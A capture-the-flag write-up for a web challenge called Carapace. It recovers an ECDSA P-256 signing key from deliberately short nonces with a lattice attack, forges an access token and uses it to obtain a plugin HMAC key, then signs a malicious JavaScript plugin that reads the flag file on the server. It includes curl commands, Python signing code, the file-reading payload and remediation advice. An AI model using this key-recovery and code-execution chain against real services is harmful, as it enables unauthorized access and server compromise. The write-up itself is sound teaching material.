# Carapace — Web Exploitation Write-up

## Challenge summary

Carapace is a remote envelope vault. Any user can register, list encrypted
documents, seal their own document, mint a short-lived capability for a
document they own, and open a document when they possess a valid capability.

The intended chain is:

1. Collect ECDSA signatures by repeatedly minting capabilities for an owned
   document.
2. Exploit the deliberately small ECDSA nonces to recover the P-256 private
   signing scalar with a Hidden Number Problem (HNP) lattice.
3. Forge a capability for the operator-owned `plugin signer credential`.
4. Open that document and recover the plugin HMAC key.
5. Sign and load a malicious plugin, then use it to read the flag.

Target used during the solve:

```text
http://13.232.228.36
```

## 1. Reconnaissance

The front-end JavaScript, `/app.js`, identifies the important API routes:

```text
POST /api/v1/auth/register
GET  /api/v1/auth/me
GET  /api/v1/vault/documents
POST /api/v1/vault/seal
POST /api/v1/vault/capability
POST /api/v1/vault/open
GET  /api/v1/spec
```

The public specification is the key clue:

```bash
curl -s http://13.232.228.36/api/v1/spec | jq
```

Relevant details from the response:

- Capabilities are `base64url(payload).base64url(r || s)`.
- Signatures use ECDSA P-256 and SHA-256.
- SHA-256 is applied to the payload bytes exactly as transmitted.
- The nonce is drawn from a 128-bit pool.
- Plugin signatures are `HMAC-SHA256(name || 0x0a || source)`.
- The plugin signing credential is sealed inside the vault.

Listing the vault also reveals document 1:

```text
#1 plugin signer credential / key-material / owner vault-operator
```

## 2. Register and create a signing oracle

Register a normal user and retain the returned API key:

```bash
curl -s -X POST http://13.232.228.36/api/v1/auth/register \
  -H 'Content-Type: application/json' \
  --data '{"username":"solver123","displayName":"Solver"}'
```

Create a document owned by that user:

```bash
curl -s -X POST http://13.232.228.36/api/v1/vault/seal \
  -H "Authorization: Bearer $API_KEY" \
  -H 'Content-Type: application/json' \
  --data '{"title":"oracle","kind":"note","plaintext":"x"}'
```

Repeated requests for that document produce messages and valid ECDSA
signatures under the server's global capability-signing key:

```bash
curl -s -X POST http://13.232.228.36/api/v1/vault/capability \
  -H "Authorization: Bearer $API_KEY" \
  -H 'Content-Type: application/json' \
  --data '{"docId":OWN_DOCUMENT_ID}'
```

Collect roughly 12–20 capabilities. Each payload contains a fresh `jti`, so
the signed messages differ.

## 3. Why the 128-bit ECDSA nonce is fatal

For curve order `n`, private scalar `d`, nonce `k`, message hash `h`, and
signature `(r,s)`, ECDSA satisfies:

```text
s*k = h + r*d  (mod n)
```

Multiplying by `s^-1` gives:

```text
k = a*d + b  (mod n)
a = r*s^-1 mod n
b = h*s^-1 mod n
```

P-256 has an order close to 2^256, but the server restricts every nonce to
less than 2^128. For several signatures, the correct `d` is therefore the
single value for which all residues `a_i*d + b_i mod n` are unusually small.
This is the Hidden Number Problem.

For `m` signatures, construct a closest-vector lattice with row basis:

```text
n^2  0    ... 0    0
0    n^2  ... 0    0
...                   
0    0    ... n^2  0
n*a1 n*a2 ... n*am 2^128
```

and target:

```text
(-n*b1, -n*b2, ..., -n*bm, 0)
```

The closest lattice vector has a final coordinate `2^128*d` (possibly using
the equivalent signed representative). Reduce the basis with LLL, apply a CVP
solver/Babai nearest plane, extract `d`, and verify it by checking that every
recovered nonce is below `2^128`:

```python
k_i = (a_i * d + b_i) % n
assert all(k_i < 2**128 for i in range(m))
```

Important parsing details:

```python
payload_b64, signature_b64 = capability.split('.')
payload = b64url_decode(payload_b64)
h = int.from_bytes(sha256(payload).digest(), 'big')
raw = b64url_decode(signature_b64)
r = int.from_bytes(raw[:32], 'big')
s = int.from_bytes(raw[32:], 'big')
```

Hash the decoded compact-JSON payload bytes, not the base64url text. The
phrase "payload bytes exactly as transmitted" refers to those compact JSON
bytes; reserializing the parsed JSON can change the signature input.

## 4. Forge an operator capability

Create a payload that names document 1 and the ID of our authenticated user.
In this solve the registered user ID was `7`. Keep
the claim names and compact JSON encoding used by legitimate tokens:

```json
{"v":1,"doc":1,"sub":7,"kind":"key-material","iat":CURRENT_TIME,"exp":CURRENT_TIME_PLUS_900,"jti":"0123456789abcdef"}
```

Hash the compact JSON bytes and sign them with the recovered P-256 scalar,
then base64url-encode the JSON without padding. Encode `r` and `s` as exactly 32
big-endian bytes each, concatenate them, and base64url-encode without padding.

The forged token is:

```text
base64url(payload) + "." + base64url(r || s)
```

The capability's subject must match the authenticated requester, not the
document owner. A forged token with `sub: 1` fails with `E_CRPC_14`, while the
same token with our user ID succeeds. The forged `doc` claim provides access
to the operator-owned document.

```bash
curl -s -X POST http://13.232.228.36/api/v1/vault/open \
  -H "Authorization: Bearer $API_KEY" \
  -H 'Content-Type: application/json' \
  --data "{\"docId\":1,\"capability\":\"$FORGED_CAPABILITY\"}"
```

This returned:

```json
{"svc":"plugin-signer","alg":"HMAC-SHA256","key":"dae13378dbffc79ec219a5ccdfe670f0"}
```

## 5. Plugin-signing to code execution

The public spec defines the plugin MAC exactly:

```text
hex(HMAC-SHA256(plugin_key, name || "\n" || source))
```

The loader endpoint is:

```text
POST /api/v1/plugins/install
```

It expects JSON fields `name`, `source`, and `signature`. The credential's
hex-looking key is used as an ASCII string, not decoded as hexadecimal.

The loader invokes the exported `register()` with no arguments and reflects a
thrown exception's message in the `detail` field. That makes direct error-based
file exfiltration possible:

```javascript
module.exports={register(){throw new Error(require('fs').readFileSync('/flag.txt','utf8'))}}
```

Sign the exact source bytes—newline differences matter:

```python
signature = hmac.new(
    b"dae13378dbffc79ec219a5ccdfe670f0",
    name.encode() + b"\n" + source.encode(),
    hashlib.sha256,
).hexdigest()
```

Submitting this signed plugin returns the flag in the expected loader error:

```json
{"error":"plugin_load_failed","code":"E_CRPC_33","detail":"CTF{sh0rt_n0nc3s_f0ld_1nt0_4_l4tt1c3}\n"}
```

## Root cause

The server's ECDSA implementation uses only 128 bits of nonce entropy for a
256-bit curve. ECDSA requires an unpredictable nonce spanning the full scalar
field (or a correct deterministic construction such as RFC 6979). Multiple
signatures with half-size nonces expose the private key through lattice
reduction. Because the same key authorizes arbitrary capability claims, this
becomes an authorization bypass. Storing the plugin HMAC key behind that same
authorization boundary turns the bypass into server-side code execution.

## Remediation

- Generate P-256 nonces uniformly in `[1,n-1]`, or use RFC 6979.
- Rotate the compromised capability-signing key.
- Do not treat a client-supplied capability subject as the active requester;
  bind it to the authenticated principal where appropriate.
- Remove runtime loading of user-submitted JavaScript, even when HMAC-signed.
- Separate cryptographic roots and security domains so a capability-key
  compromise cannot expose a code-signing credential.

## Flag

```text
CTF{sh0rt_n0nc3s_f0ld_1nt0_4_l4tt1c3}
```
